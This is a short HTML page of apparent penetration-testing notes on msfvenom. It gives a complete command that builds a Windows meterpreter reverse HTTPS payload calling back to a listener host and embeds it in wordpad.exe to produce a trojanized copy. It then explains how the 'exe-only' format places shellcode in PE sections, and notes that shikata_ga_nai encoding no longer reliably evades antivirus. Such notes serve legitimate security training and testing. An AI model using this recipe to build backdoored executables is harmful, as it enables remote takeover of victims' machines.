<title>MSFVenom</title>
</head><body><i>Note:  You may see references to utilizing polymorphic encoders (specifically shikata_ga_nai) within Metasploit as a viable method for evading detection.  While these types of encoders did have an unintended side-effect of bypassing a/v in the past, this often doesn’t hold true with modern detection software.  The primary purpose of encoders is to remove bad characters (<span style="font-family: courier new">x00</span>, <span style="font-family: courier new">x0A</span>, etc.) from shellcode that might cause undesirable results in a program.</i><br/>
<br/>
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -x wordpad.exe -k -f exe -o wordpad1.exe &nbsp;&#09;&#09;-x use wordpad.exe as a template<br/>
<br/>
<br/>
There is an interesting additional command line flag to “msfvenom” to change the format to “exe-only” rather than “exe”. &nbsp;This flag has the effect of either creating a new section header, or modifying the existing “.text” section in the case of 64-bit binaries. &nbsp;<br/>
In the case of 32-bit binaries, the shellcode ends up in the “.text” section regardless, however, the characteristics flags differ and some extra assembly code are introduced in the “exe-only” version.</body></html>
